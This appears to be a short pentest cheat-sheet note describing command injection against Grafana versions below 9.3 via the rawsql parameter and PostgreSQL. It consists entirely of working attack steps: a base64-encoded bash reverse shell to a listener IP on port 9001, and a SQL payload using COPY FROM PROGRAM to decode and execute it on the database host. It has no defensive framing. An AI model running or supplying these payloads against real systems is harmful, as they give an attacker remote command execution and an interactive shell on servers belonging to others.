# grafana rawsql exploit

OS: Web
Description: Exploit the rawsql command in <9.3 Grafana
Security Domains: Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21)
Target_Technology: postgres (https://www.notion.so/postgres-2f34c8e5237680649cb6f2af13adfb01?pvs=21)

### Base64 Encode a Bash Reverse Shell

```jsx
echo "bash -i >& /dev/tcp/IP_OF_LISTENER/9001 0>&1" | base64 -w 0
```

## Tweak it by adding spaces after -i until no `+` signs appear in the base64.

### rawsql parameter with grafana:

```jsx
DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'echo BASE64_ENCODED_COMMAND | base64 -d | bash';
```